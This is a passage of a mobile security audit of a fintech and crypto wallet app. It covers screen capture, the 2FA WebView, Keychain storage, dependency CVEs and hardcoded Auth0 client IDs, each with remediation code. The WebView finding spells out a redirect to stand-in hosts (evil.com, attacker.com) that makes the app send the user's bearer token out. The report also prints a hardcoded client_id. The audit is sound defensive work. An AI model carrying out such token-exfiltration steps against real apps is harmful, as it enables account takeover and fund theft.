| [src/screens/Statement/](src/screens/Statement/), [SgdStatement/](src/screens/SgdStatement/) | Full transaction statements |
| [src/screens/Chatbot/chatscreen.tsx](src/screens/Chatbot/chatscreen.tsx) | Support conversations |
| [src/screens/Profile/ChangePassword.tsx](src/screens/Profile/ChangePassword.tsx) | Password fields |

Note that the app *does* implement partial masking helpers — `hideDigits()` and `hideDigitBeforLast()` at [src/utils/helpers/index.tsx:438-459](src/utils/helpers/index.tsx#L438-L459) — showing awareness of the concern, but these apply only to specific rendered values and do nothing about capture of the unmasked reveal state.

#### Attack Scenario

**Scenario A — Screen-capture malware.** Malware with an accessibility service (Android) or a malicious profile (iOS) captures the screen while the user reveals their card PAN/CVV/PIN. Full card data is exfiltrated with no root required on Android.

**Scenario B — Recents thumbnail forensics.** The user opens card details, then backgrounds the app. The OS writes a thumbnail containing the PAN to disk. An attacker with later filesystem access (device theft, forensic extraction, or backup — though `allowBackup="false"` blocks the Android backup vector) recovers card data even though the app itself stores none.

**Scenario C — Shoulder-surfing at scale / social engineering.** A support-impersonation attacker asks the victim to "screenshot your card details and send them for verification". Nothing in the app resists this, and the screenshot lands in the user's photo library and cloud photo backup.

**Scenario D — Screen sharing.** A user on a video call with a screen-sharing session open reveals card details unknowingly.

#### Risk Impact

- **PCI-DSS:** Capture and disk-persistence of full PAN plus CVV in an uncontrolled location (device photo library, OS snapshot cache, cloud photo backup) is a direct violation of Req. 3.2/3.4 expectations for cardholder data handling.
- **Confidentiality:** Card data, wallet addresses, KYC documents, and statements all capturable.
- **Fraud:** Card data captured this way is immediately usable for card-not-present fraud.

#### Exploitation Possibility

**High.** Scenario C requires no technical capability at all; Scenario B happens passively during normal use.

#### Recommended Fix

**Android — global `FLAG_SECURE` (simplest, strongest):**
```kotlin
// android/app/src/main/java/com/exchangapay/app/MainActivity.kt
import android.view.WindowManager

override fun onCreate(savedInstanceState: Bundle?) {
    RNBootSplash.init(this, R.style.BootSplashTheme)
    window.setFlags(
        WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE
    )
    super.onCreate(null)
}
```
This blocks screenshots, screen recording, and Recents-thumbnail capture app-wide. For a fintech app, app-wide is the right default; if product objects to blocking screenshots of, say, the referral screen, expose a native module to toggle the flag per screen instead.

**iOS — snapshot blurring + capture detection:**
```swift
// AppDelegate.swift
private var privacyOverlay: UIView?

func applicationWillResignActive(_ application: UIApplication) {
    let overlay = UIVisualEffectView(effect: UIBlurEffect(style: .systemMaterial))
    overlay.frame = window?.bounds ?? .zero
    window?.addSubview(overlay)
    privacyOverlay = overlay
}

func applicationDidBecomeActive(_ application: UIApplication) {
    privacyOverlay?.removeFromSuperview()
    privacyOverlay = nil
}
```
iOS provides no equivalent to `FLAG_SECURE` for blocking screenshots outright, so additionally:
- Observe `UIScreen.capturedDidChangeNotification` and hide sensitive content while `UIScreen.main.isCaptured == true`.
- Observe `UIApplication.userDidTakeScreenshotNotification` to log the event and (optionally) warn the user.

**Cross-platform:** consider `react-native-screenguard` or `expo-screen-capture` to wrap both platforms behind one API, applied at minimum to the card, PIN, KYC, statement, and chat screens.

**Additionally:** mask card data by default and require an explicit, time-limited reveal (the app already has `hideDigits`); auto-hide the reveal after ~15 seconds; and combine with the biometric re-authentication recommended in [H-14](#h-14--biometric-gate-is-client-side-navigation-only) before any PAN/PIN reveal.

#### Best Practice Recommendation

Apply `FLAG_SECURE` globally on Android for any app handling cardholder data, and treat the iOS snapshot overlay as mandatory rather than optional. Pair capture prevention with data minimisation on screen — show the last four digits by default and require step-up authentication for the full reveal, so the window in which sensitive data is on screen is as small as possible.

---
### H-10 — Insecure WebView Configuration in the 2FA Withdrawal Flow

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-749 (Exposed Dangerous Method), CWE-940 (Improper Verification of Source), CWE-346 (Origin Validation Error) |
| **MASVS** | MASVS-PLATFORM-2, MASVS-PLATFORM-6 |
| **OWASP Mobile Top 10** | M4 — Insufficient Input/Output Validation |
| **File** | [src/screens/Crypto/sendCryptoDetails.tsx:693-701](src/screens/Crypto/sendCryptoDetails.tsx#L693-L701), [:467-474](src/screens/Crypto/sendCryptoDetails.tsx#L467-L474) |

#### Technical Explanation

The **crypto withdrawal two-factor authentication step** — the single highest-value operation in the application — is implemented as a WebView whose URL comes from an API response, with security-relevant decisions driven by URL string matching:

```tsx
<WebView
  source={{ uri: twoFactorAuthUrl }}          // ← server-supplied, unvalidated
  style={styles.webView}
  onNavigationStateChange={handleWebViewNavigationStateChange}
  javaScriptEnabled={true}                     // ← enabled
  domStorageEnabled={true}                     // ← enabled
  startInLoadingState={true}
  renderLoading={renderWebViewLoading}
/>
```

The URL is assigned directly from the response body with no validation:
```tsx
const res: any = await CryptoServices.updateTwoFactorAuthentication(body);
if (res.ok && res.data) {
  setTwoFactorAuthUrl(res.data);      // ← res.data used verbatim as a URL
  setWebViewVisible(true);
}
```

And success is inferred from a **substring match on the navigation URL**:
```tsx
const handleWebViewNavigationStateChange = async (navState: any) => {
  if (navState.url?.includes("/api/v1/Common/TwoFactorAuthenticationCodeState")) {
    await trigger2FAValidation(navState.url);
    return;
  }
};
```

`trigger2FAValidation` then takes that URL — again, whatever the WebView navigated to — and issues an **authenticated request with the user's bearer token** to it:

```tsx
// src/services/crypto.tsx:87-97
makeAuthenticatedGetRequest: async (url: string) => {
    const credentials = await Keychain.getGenericPassword({ service: "authTokenService" });
    const { token } = JSON.parse(credentials.password);
    return axios.get(url, {                    // ← arbitrary URL
        headers: { Authorization: `Bearer ${token}` },   // ← token attached
    });
}
```

The specific problems:

1. **Missing `originWhitelist`.** `react-native-webview` defaults to `["http://*", "https://*"]` — the WebView will navigate to *any* HTTP(S) origin. A redirect (open or otherwise) from the 2FA provider takes the user to an attacker page inside a WebView the user believes is the app.
2. **`javaScriptEnabled` + `domStorageEnabled` with no origin restriction.** JS is required for the 2FA flow, but combined with unrestricted navigation, any page the WebView reaches executes script in a context the user trusts.
3. **`.includes()` is not URL validation.** `https://evil.com/?x=/api/v1/Common/TwoFactorAuthenticationCodeState` satisfies the check. There is no host comparison, no scheme check, no path-prefix anchoring.
4. **Bearer token sent to an attacker-controllable URL.** This is the critical consequence: `makeAuthenticatedGetRequest(navState.url)` attaches the user's Auth0 access token to a GET request against whatever URL passed the substring test. **This is a token-exfiltration primitive.**
5. **Cookie sharing.** The flow relies on cookies (`Cookies.clearAll(true)` is called on a specific error at [:459](src/screens/Crypto/sendCryptoDetails.tsx#L459)), and `@react-native-cookies/cookies` shares the cookie jar between the WebView and native requests — so session cookies are exposed to whatever the WebView loads.
6. **No `onShouldStartLoadWithRequest`.** The correct hook for gating navigation is absent entirely.
7. **No certificate pinning in the WebView** ([H-03](#h-03--no-certificate-pinning-on-either-platform)), and on Android the WebView does not use the app's network security config unless it is declared ([H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest)).

Additionally, `RenderHTML`/`RenderHtml` from `react-native-render-html` renders server-supplied HTML in five locations ([Notifications.tsx:250](src/screens/AccountDashboard/Notifications.tsx#L250), [HelpCenter.tsx:84](src/screens/HelpCenter/HelpCenter.tsx#L84), [QuickLinks.tsx:66](src/screens/QuickLinks/QuickLinks.tsx#L66), [messagePopup.tsx:101](src/screens/Profile/messagePopup.tsx#L101), [notifyAlerts.tsx:79](src/screens/AccountDashboard/notifyAlerts.tsx#L79)) with no sanitisation configuration. `react-native-render-html` does not execute JS, so this is lower-severity than the WebView, but combined with `Linking.openURL(href)` handlers on anchor presses ([Notifications.tsx:51-54](src/screens/AccountDashboard/Notifications.tsx#L51-L54), [accountProgress.tsx:68](src/screens/onBoarding/accountProgress.tsx#L68)) it creates a phishing vector: a malicious or compromised notification can render a link that opens an arbitrary URL when tapped.

#### Attack Scenario

**Scenario A — Token exfiltration via redirect (highest impact).**
1. Attacker achieves a MITM position (no pinning) or compromises/abuses the 2FA provider's redirect handling.
2. The WebView is navigated to `https://attacker.com/collect?next=/api/v1/Common/TwoFactorAuthenticationCodeState`.
3. `handleWebViewNavigationStateChange` matches the substring and calls `trigger2FAValidation(navState.url)`.
4. `makeAuthenticatedGetRequest` issues `GET https://attacker.com/collect?next=...` **with `Authorization: Bearer <user's access token>`**.
5. The attacker now holds a valid bearer token for a user who was mid-withdrawal. Full account takeover, and the token has no device binding or replay protection ([VAPT-06](#vapt-06--token-replay)).

**Scenario B — Withdrawal approval spoofing.**
1. Attacker controls the page reached in the WebView and navigates to a URL containing the magic substring.
2. `trigger2FAValidation` fires; if the attacker can also influence the response (`response?.data === true`), the app navigates to `SendCryptoSuccess` and the user believes the withdrawal completed — or, more usefully to an attacker, the 2FA step is registered as satisfied.
3. Combined with request tampering on the unpinned withdrawal call, the destination `walletAddress` is attacker-controlled.

**Scenario C — Credential phishing inside the trusted WebView.** The WebView has no visible URL bar. An attacker-controlled page rendering an Auth0-styled login form is indistinguishable from the real one to the user.

#### Risk Impact

- **Financial:** Direct path to crypto fund theft — this is the withdrawal flow.
- **Account takeover:** Bearer token exfiltration to an arbitrary host.
- **Integrity:** 2FA — the compensating control for high-value transactions — is bypassable.

#### Exploitation Possibility

**Medium-High.** Requires either a MITM position (achievable per H-02/H-03) or an open-redirect/compromise at the 2FA endpoint. The impact justifies treating it as High regardless.

#### Recommended Fix

1. **Validate the URL before loading it**, and reject anything not on an allow-listed host:
   ```tsx
   const ALLOWED_2FA_HOSTS = new Set(["api.exchangapay.com"]);

   const isAllowed = (raw: string) => {
     try {
       const u = new URL(raw);
       return u.protocol === "https:" && ALLOWED_2FA_HOSTS.has(u.hostname);
     } catch { return false; }
   };

   if (res.ok && res.data && isAllowed(res.data)) {
     setTwoFactorAuthUrl(res.data);
     setWebViewVisible(true);
   } else {
     setErrormsg("Unable to start verification. Please try again.");
   }
   ```
2. **Gate navigation with `onShouldStartLoadWithRequest`** — this is the control that actually prevents the WebView leaving the allowed origin:
   ```tsx
   <WebView
     source={{ uri: twoFactorAuthUrl }}
     originWhitelist={["https://api.exchangapay.com"]}
     onShouldStartLoadWithRequest={(req) => isAllowed(req.url)}
     onNavigationStateChange={handleWebViewNavigationStateChange}
     javaScriptEnabled={true}
     domStorageEnabled={true}
     thirdPartyCookiesEnabled={false}
     allowFileAccess={false}
     allowFileAccessFromFileURLs={false}
     allowUniversalAccessFromFileURLs={false}
     mixedContentMode="never"
     setSupportMultipleWindows={false}
     javaScriptCanOpenWindowsAutomatically={false}
     incognito={true}
     startInLoadingState={true}
     renderLoading={renderWebViewLoading}
   />
   ```
3. **Replace the substring match with parsed comparison:**
   ```tsx
   const handleWebViewNavigationStateChange = async (navState: any) => {
     try {
       const u = new URL(navState.url);
       if (u.protocol === "https:" &&
           ALLOWED_2FA_HOSTS.has(u.hostname) &&
           u.pathname === "/api/v1/Common/TwoFactorAuthenticationCodeState") {
         await trigger2FAValidation(navState.url);
       }
     } catch { /* ignore malformed */ }
   };
   ```
4. **Never send the bearer token to a dynamic URL.** Rewrite `makeAuthenticatedGetRequest` to take only a *path* and route it through the standard `ApiService` instance whose `baseURL` is fixed:
   ```ts
   // src/services/crypto.tsx
   verifyTwoFactorState: async (code: string) =>
       get(`api/v1/Common/TwoFactorAuthenticationCodeState?code=${encodeURIComponent(code)}`),
   ```
   Extract the needed parameter from the WebView URL and pass *that*, not the URL.
5. **Prefer eliminating the WebView.** A native OTP entry screen calling a JSON API removes this entire attack surface. The app already has OTP components ([src/components/DefualtOtpInput.tsx](src/components/DefualtOtpInput.tsx), [SendOTP.tsx](src/components/SendOTP.tsx)) — reuse them. If the 2FA provider requires a hosted page, use `react-native-inappbrowser` / ASWebAuthenticationSession, which shows the real URL and isolates cookies.
6. **Sanitise `RenderHTML` input.** Configure `tagsStyles`/`ignoredDomTags` to strip `<script>`, `<iframe>`, `<object>`, `<embed>`, and event-handler attributes, and validate `href` schemes (`https:` and `mailto:` only) before calling `Linking.openURL`:
   ```tsx
   const safeOpen = (href: string) => {
     try {
       const u = new URL(href);
       if (["https:", "mailto:"].includes(u.protocol)) Linking.openURL(href);
     } catch {}
   };
   ```

#### Best Practice Recommendation

Treat every WebView as a hostile-content boundary: allow-list origins, gate navigation, disable file access, isolate cookies, and never attach app credentials to a URL the WebView produced. For authentication and payment-authorisation flows specifically, prefer native UI or a system-provided authentication session over an embedded WebView — the embedded WebView provides no origin indicator to the user, which is precisely what makes phishing inside it effective.

---

### H-11 — Keychain Entries Stored Without Access Control or Biometric Binding

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-522 (Insufficiently Protected Credentials), CWE-311 |
| **MASVS** | MASVS-STORAGE-1, MASVS-AUTH-2 |
| **OWASP Mobile Top 10** | M9 — Insecure Data Storage |
| **Files** | [src/utils/helpers/index.tsx:806-818](src/utils/helpers/index.tsx#L806-L818), [src/hooks/useMemberLogin.tsx:72-79](src/hooks/useMemberLogin.tsx#L72-L79), [src/services/chatService.js:72](src/services/chatService.js#L72), [src/screens/Chatbot/chatscreen.tsx:157](src/screens/Chatbot/chatscreen.tsx#L157) |

#### Technical Explanation

Every `Keychain.setGenericPassword` call in the codebase passes only a `service` name — **no `accessControl`, no `accessible`, no `securityLevel`, no `storage` option**:

```ts
// src/utils/helpers/index.tsx:810-816 — the auth token
await Keychain.setGenericPassword(
  "authToken",
  JSON.stringify({ token, expiryTime, refresh_token }),
  { service: "authTokenService" }       // ← only option supplied
);
```

```tsx
// src/hooks/useMemberLogin.tsx:72-79 — the full member record incl. `sk`
await Keychain.setGenericPassword(
  "userInfo",
  JSON.stringify(userDetails),
  { service: "userInfoService" }        // ← only option supplied
);
```

A repository-wide search for `ACCESS_CONTROL`, `ACCESSIBLE`, `accessControl:`, `accessible:`, and `securityLevel` returns **zero matches**.

**What this means in practice:**

| Platform | Default applied | Consequence |
|---|---|---|
| **iOS** | `kSecAttrAccessibleWhenUnlocked` | Readable by the app whenever the device is unlocked. **Included in iCloud Keychain sync and encrypted iTunes/Finder backups** — the item leaves the device. No biometric prompt required to read. |
| **Android** | `react-native-keychain` picks the best available cipher, typically AES via the Android Keystore | Keystore-backed (good), but **`setUserAuthenticationRequired` is not set**, so no biometric/PIN is needed to use the key. Readable by the app process at any time. |

**What is stored under these weak defaults:**

| Service | Contents | Sensitivity |
|---|---|---|
| `authTokenService` | `{ token, expiryTime, refresh_token }` — **Auth0 access + refresh token** | Critical |
| `userInfoService` | Full member record including **`sk`** (the AES key for all PII), `role`, `customerState`, `isKYC`, encrypted PII fields | Critical |
| `root` (redux-persist, per [H-05](#h-05--redux-persist-encryption-transform-is-disabled)) | Persisted Redux blob incl. `userDetails` (tokens) and `userInfo` | Critical |
| `chat_bot` | Kommo `scope_id` | Low |
| `chat_conversation_Id` | Conversation identifier | Low |

The **refresh token** deserves particular emphasis: it is long-lived, it is used by [`checkAndRefreshToken`](src/utils/helpers/index.tsx#L914-L952) to mint new access tokens indefinitely, and it is stored with no authentication requirement. An attacker who reads it once has **persistent** account access that survives password changes unless the backend explicitly revokes refresh tokens on password change.

**A further gap:** `iOS` items are not marked `ThisDeviceOnly`, so they sync to iCloud Keychain and are captured in device backups. A user's tokens and `sk` therefore exist outside the device, in Apple's infrastructure and in any local backup on their computer.

**And a correctness note:** there are two different token-read functions with different service scoping. [`getTokenData()`](src/utils/helpers/index.tsx#L426-L437) calls `Keychain.getGenericPassword()` with **no service argument**, while [`GetTokens()`](src/utils/ApiService.ts#L11-L24) correctly specifies `{ service: "authTokenService" }`. `getTokenData` is used by [src/utils/api.tsx:5](src/utils/api.tsx#L5) (`setToken`). Reading without a service reads the *default* keychain entry, which may be a different item entirely — a latent bug that could return the wrong credential or `null`.

#### Attack Scenario

**Scenario A — Unlocked-device theft.** Device is stolen while unlocked or with a known/observed PIN. Attacker installs a debugging tool or, on a jailbroken device, dumps the Keychain. Because no item requires biometric authentication, **everything is readable immediately**: access token, refresh token, `sk`, full member record. The attacker has indefinite account access via the refresh token.

**Scenario B — Backup extraction (iOS).** Attacker obtains an encrypted iTunes/Finder backup (from the user's computer, or via malware). Because items are not `ThisDeviceOnly`, tokens and `sk` are present in the backup. With the backup password (often weak or stored in the keychain of the host machine), the attacker extracts credentials **without ever touching the phone**.

**Scenario C — Rooted/jailbroken device.** Per [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation), no detection exists. On such a device, Keystore/Keychain items with no user-authentication requirement are extractable by a privileged process.

**Scenario D — Malicious app on the same device (Android).** While Keystore isolation generally prevents cross-app access, the absence of `setUserAuthenticationRequired` combined with a compromised app process (via a WebView exploit, a vulnerable dependency, or the RCE-adjacent risk from the unpinned WebView in [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow)) yields the tokens directly.

#### Risk Impact

- **Persistent account takeover** via an unprotected refresh token.
- **Full PII decryption** via an unprotected `sk`.
- **Off-device exposure** through iCloud sync and backups.

#### Exploitation Possibility

**Medium.** Requires device access or a backup, but yields complete compromise with no further work and no time limit.

#### Recommended Fix

1. **Add explicit access control to every sensitive Keychain write:**
   ```ts
   import * as Keychain from "react-native-keychain";

   const SECURE_OPTS: Keychain.Options = {
     accessible:    Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY,  // no iCloud, no backup
     accessControl: Keychain.ACCESS_CONTROL.BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE,
     securityLevel: Keychain.SECURITY_LEVEL.SECURE_HARDWARE,             // require StrongBox/SE
     storage:       Keychain.STORAGE_TYPE.AES_GCM,                       // Android
   };

   export const storeToken = async (token: string, refresh_token: any) => {
     const decoded: any = jwtDecode(token);
     await Keychain.setGenericPassword(
       "authToken",
       JSON.stringify({ token, expiryTime: decoded.exp * 1000, refresh_token }),
       { service: "authTokenService", ...SECURE_OPTS }
     );
   };
   ```
   `BIOMETRY_CURRENT_SET` is important: it invalidates the entry if the enrolled biometrics change, preventing an attacker who adds their own fingerprint from gaining access.
2. **Consider splitting the refresh token into a separately-protected entry** with a stricter policy than the access token — the access token is read on every API call (so a biometric prompt each time is unacceptable), whereas the refresh token is read rarely and can afford `ACCESS_CONTROL.BIOMETRY_CURRENT_SET`.
3. **Use `WHEN_UNLOCKED_THIS_DEVICE_ONLY`** on all sensitive items so they are excluded from iCloud Keychain and from backups.
4. **Handle the failure modes.** With `accessControl` set, reads can now fail (biometric cancelled, biometrics changed, hardware unavailable). Every `getGenericPassword` call site currently swallows errors and returns `null` — which would silently log the user out. Add explicit handling that distinguishes "user cancelled" from "item invalidated" and prompts appropriately.
5. **Verify hardware backing at runtime.** `Keychain.getSecurityLevel()` reports whether secure hardware is available; on devices without it, consider degrading functionality (e.g. requiring re-authentication more often) rather than silently falling back to software storage.
6. **Fix the service-scoping inconsistency.** Make [`getTokenData()`](src/utils/helpers/index.tsx#L426) specify `{ service: "authTokenService" }` like `GetTokens()` does, or delete it and consolidate on one accessor.
7. **Reset every service on logout.** [`useLogOut`](src/hooks/useLogOut.tsx#L54-L55) resets only `chat_conversation_Id` and `authTokenService`. Add `userInfoService`, `chat_bot`, and the redux-persist `root` entry.

#### Best Practice Recommendation

Sensitive Keychain items in a financial app should be: device-only (never synced or backed up), hardware-backed where available, and bound to current biometric enrolment for anything long-lived. Define one `SECURE_OPTS` constant and require its use — a wrapper function that makes it impossible to call `setGenericPassword` without options is better than a convention.

---

### H-12 — 21 Known Dependency Vulnerabilities (11 High Severity)

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-1395 (Dependency on Vulnerable Third-Party Component), CWE-937 |
| **MASVS** | MASVS-CODE-3 |
| **OWASP Mobile Top 10** | M2 — Inadequate Supply Chain Security |
| **Evidence** | `npm audit` on the audited commit |

#### Technical Explanation

```
SUMMARY: {'info': 0, 'low': 0, 'moderate': 10, 'high': 11, 'critical': 0, 'total': 21}
```

| Severity | Package | Vulnerable range | Introduced via |
|---|---|---|---|
| **HIGH** | `react-native-phone-number-input` | `*` | direct dependency |
| **HIGH** | `react-native-country-picker-modal` | `>=1.0.0` | ← phone-number-input |
| **HIGH** | `modal-react-native-web` | `>=0.1.3` | ← country-picker-modal |
| **HIGH** | `react-native-web` | `<=0.14.13` | ← modal-react-native-web |
| **HIGH** | `fbjs` | `0.7.0 - 1.0.0` | ← react-native-web |
| **HIGH** | `isomorphic-fetch` | `2.0.0 - 2.2.1` | ← fbjs |
| **HIGH** | `node-fetch` | `<2.6.7` | ← isomorphic-fetch |
| **HIGH** | `react-native-bootsplash` | `>=4.5.0` | direct dependency |
| **HIGH** | `sharp` | `<0.35.0` | ← bootsplash (build-time) |
| **HIGH** | `d3-color` | `1.0.2 - 3.0.1` | ← victory-native |
| **HIGH** | `brace-expansion` | `<1.1.17 \|\| 2.0.0-2.1.2` | transitive (build) |
| MODERATE | `fast-xml-parser` | `<5.7.0` | ← RN CLI platform packages |
| MODERATE | `@react-native-community/cli*` (5 pkgs) | `<=20.1.1` | devDependencies |
| MODERATE | `uuid` | `<11.1.1` | ← xcode |
| MODERATE | `xcode` | `>=0.9.2` | ← @expo/config-plugins |
| MODERATE | `@expo/config-plugins` | `*` | ← bootsplash |

**Assessing actual exposure — the runtime-reachable chain matters most:**

- **`react-native-phone-number-input` → … → `node-fetch <2.6.7`** is the significant one. This is a **direct dependency**, actively used ([src/components/PhoneInput.tsx](src/components/PhoneInput.tsx), [PhoneCodeSelect.tsx](src/components/PhoneCodeSelect.tsx)) in the registration and profile flows. `node-fetch <2.6.7` carries **CVE-2022-0235 (exposure of sensitive information — `Authorization`/`Cookie` headers forwarded across redirects to a different host)**. In a React Native runtime `node-fetch` is typically not the fetch implementation actually used (RN provides its own via Hermes/native networking), which materially reduces real-world exposure — but the dependency is present in the tree and `react-native-web` pulling `fbjs` into a native app indicates the package is carrying substantial dead web-platform weight.
- **`d3-color 1.0.2–3.0.1`** — **CVE-2022-46175 / ReDoS**. Reachable: `victory-native@36.9.2` is a direct dependency and charts render user/market-derived data. A crafted colour string causes catastrophic regex backtracking, freezing the JS thread. Practical impact here is likely a denial of service on a chart screen rather than a security breach, since colour values are app-controlled — but see the note on three charting libraries in [L-02](#l-02--duplicated-and-redundant-dependencies).
- **`sharp <0.35.0`**, **`brace-expansion`**, **`fast-xml-parser`**, **`@react-native-community/cli*`**, **`xcode`**, **`uuid`** — all **build-time only**. They do not ship in the app binary. Their risk is to the **build pipeline**: a malicious input processed during a build could achieve code execution on a developer machine or CI runner. Given [§13](#13-devops--cicd-security) shows CI was recently deleted and builds now happen on developer machines, this is a real (if lower-priority) supply-chain concern.
- **`react-native-bootsplash >=4.5.0`** is flagged only via its `@expo/config-plugins`/`sharp` build-time chain, not for a runtime defect in the library itself.

**Beyond CVEs — unmaintained and deprecated packages in the dependency set:**

| Package | Installed | Status |
|---|---|---|
| `redux-persist-keychain-storage` | 0.1.1 | **Last published ~2018.** 27 lines, no tests, stores all persisted state ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)). |
| `react-native-signature-capture` | 0.4.12 | Unmaintained; pre-AndroidX (requires Jetifier). |
| `react-native-splash-screen` | 3.3.0 | Unmaintained; pre-AndroidX. **Redundant** — `react-native-bootsplash` is also installed and is the one actually used ([App.tsx:35](App.tsx#L35)). |
| `react-native-push-notification` | 8.1.1 | Archived upstream; pre-AndroidX; requires a local patch (`patches/react-native-push-notification+8.1.1.patch`). **Redundant** with `@notifee/react-native`. |
| `react-native-fs` | 2.20.0 | Effectively unmaintained. **Redundant** with `react-native-blob-util`, which is also installed and more widely used in this codebase. |
| `react-native-elements` | 3.4.3 | Superseded by `@rneui/*`. **Redundant** with `@ui-kitten/components`. |
| `victory-native` | 36.9.2 | v36 is the legacy pre-Skia line; v40+ is a rewrite. Source of the `d3-color` CVE. |
| `hooks` | 0.3.2 | A 2015-era package with no clear purpose in this codebase — likely an accidental install. |
| `crypto-js` | 4.2.0 | Still present though the codebase migrated to `react-native-quick-crypto`; only [chatService.js](src/services/chatService.js) still uses it. |
| `base-64` | 1.0.0 | Used only for the `global.atob` polyfill ([helpers/index.tsx:309](src/utils/helpers/index.tsx#L309)); `react-native-quick-base64` is also installed. |

The `android.enableJetifier=true` flag in [gradle.properties](android/gradle.properties) is explicitly documented as load-bearing for `react-native-push-notification`, `react-native-signature-capture`, and `react-native-splash-screen` — three unmaintained, pre-AndroidX libraries. Jetifier is deprecated and adds measurable build time; removing these three libraries would let it be dropped.

#### Attack Scenario

**Scenario A — Build-pipeline compromise.** A malicious npm package or a crafted image/XML processed by `sharp`/`fast-xml-parser` during a build achieves code execution on a developer machine or CI runner — which, per [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), is where the signing key lives. This is the highest-impact path.

**Scenario B — ReDoS on chart rendering.** Crafted market data reaching a `victory-native` chart triggers `d3-color` catastrophic backtracking, freezing the JS thread and hanging the app.

**Scenario C — Long-tail unmaintained library.** A vulnerability discovered in `react-native-push-notification` or `redux-persist-keychain-storage` will never be patched upstream. `redux-persist-keychain-storage` is the concerning one — it handles all persisted credentials.

#### Risk Impact

- **Supply chain:** Build-time RCE risk on machines holding the signing key.
- **Availability:** ReDoS on chart screens.
- **Unpatchable tail:** Six unmaintained packages, two of them in security-relevant paths.

#### Exploitation Possibility

**Low-Medium** for the specific CVEs (most are build-time or require unusual inputs). **The finding is rated High on cumulative risk and remediation debt**, not on any single CVE being trivially exploitable.

#### Recommended Fix

1. **Run `npm audit fix`** for the transitive issues that resolve cleanly, then re-audit. Expect the `phone-number-input` and `bootsplash` chains to require manual attention.
2. **Replace `react-native-phone-number-input`.** It is unmaintained and drags `react-native-web` + `fbjs` + `node-fetch` into a native-only app. The app already has `phoneCode.json` data ([src/utils/data/phoneCode.json](src/utils/data/phoneCode.json)) and custom pickers — building a small native picker removes four High findings at once.
3. **Delete redundant duplicates** (see [L-02](#l-02--duplicated-and-redundant-dependencies)):
   - Remove `react-native-splash-screen` (keep `react-native-bootsplash`).
   - Remove `react-native-push-notification` + `@react-native-community/push-notification-ios` (keep `@notifee/react-native` + `@react-native-firebase/messaging`) — this also removes a patch file.
   - Remove `react-native-fs` (keep `react-native-blob-util`).
   - Remove `react-native-signature-capture` (keep `react-native-signature-canvas`).
   - Remove `react-native-elements` (keep `@ui-kitten/components`).
   - Remove `hooks`, `base-64` (use `react-native-quick-base64`), and `crypto-js` once [chatService.js is removed per C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript).
   - Consolidate the **three charting libraries** (`victory-native`, `react-native-chart-kit`, `react-native-wagmi-charts`) onto one — this also resolves the `d3-color` CVE.
   - Consolidate the **two date libraries** (`moment` + `moment-timezone` and `dayjs`) onto `dayjs` — 8 files import `moment`, 7 import `dayjs`.
   Removing these three pre-AndroidX libraries additionally allows `android.enableJetifier=false`, cutting build time.
4. **Replace `redux-persist-keychain-storage`** with an in-house 20-line adapter (see the [H-05 fix](#h-05--redux-persist-encryption-transform-is-disabled)).
5. **Add automated dependency scanning to CI:**
   ```yaml
   - name: Audit
     run: npm audit --audit-level=high
   ```
   plus Dependabot or Renovate for automated PRs, and consider `socket.dev` or `snyk` for install-time malicious-package detection.
6. **Generate and retain an SBOM** (`npm sbom --sbom-format cyclonedx`) per release — increasingly expected in financial-services supplier assessments.
7. **Pin exact versions** for security-relevant dependencies rather than using `^` ranges. Note the project already learned this lesson — the `.gitignore` comment explains that an uncommitted lockfile caused `react-native-reanimated 4.5.3` to install against RN 0.81. Apply the same discipline to `react-native-keychain`, `react-native-quick-crypto`, and `@sentry/react-native`.

#### Best Practice Recommendation

Treat the dependency tree as attack surface with a maintenance cost. Set a policy: no package with >12 months since last publish in a security-relevant path; no two packages solving the same problem; `npm audit --audit-level=high` as a blocking CI gate. The 21 findings here are largely the accumulated cost of eleven redundant packages — removing duplicates is the highest-leverage remediation.

---

### H-13 — Hardcoded Auth0 Client IDs and a Dead Password-Grant Login Screen

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-798, CWE-522, CWE-489 (Active Debug Code) |
| **MASVS** | MASVS-AUTH-1, MASVS-CODE-4 |
| **OWASP Mobile Top 10** | M1 — Improper Credential Usage |
| **Files** | [src/screens/Login/Login.tsx:7-35](src/screens/Login/Login.tsx#L7-L35), [Environment.js:6,22,42](Environment.js#L6) |

#### Technical Explanation

**Part 1 — A dead login screen implementing the worst possible OAuth flow.**

`src/screens/Login/Login.tsx` collects the user's email and password into local component state and posts them directly to Auth0's token endpoint:

```tsx
const login = () => {
    const bodyParams = {
      client_id: "gbWLk6GbZAayAlwuHc9tPa0hPnkC1FIk",
      grant_type: "client_credentials",         // ← wrong grant for user creds
      username: email,                           // ← user password sent to a
      password: password,                        //    client_credentials endpoint
      realm: "yellowblockDev",
      audience: "https://exchangapay.us.auth0.com/api/v2/",  // ← Management API
      scope: "openid profile email",
    };

    fetch(`https://exchangapay.us.auth0.com/oauth/token`, { ... })
      .then((responseJson) => {
        if (responseJson.error) { }               // ← errors silently swallowed
        const { id_token, access_token, expires_in } = responseJson;   // ← unused
      })
      .catch((err) => { console.error(err); });   // ← credentials may reach logs
};
```

Multiple problems compound:

1. **A fourth hardcoded Auth0 `client_id`** (`gbWLk6GbZAayAlwuHc9tPa0hPnkC1FIk`) not present in `Environment.js` — pointing at the **US** tenant (`exchangapay.us.auth0.com`), whereas the app's `tst`/`prod` configs use the **EU** tenant.
2. **`grant_type: "client_credentials"` with `username`/`password`.** `client_credentials` is the machine-to-machine grant; it does not accept user credentials. Either this request always fails (most likely), or it is misconfigured in a way that warrants investigation. Either way it demonstrates that the **Resource Owner Password Credentials (ROPC)** anti-pattern was attempted — a flow OAuth 2.1 removes entirely and which is explicitly discouraged for native apps, because it requires the app to handle raw passwords.
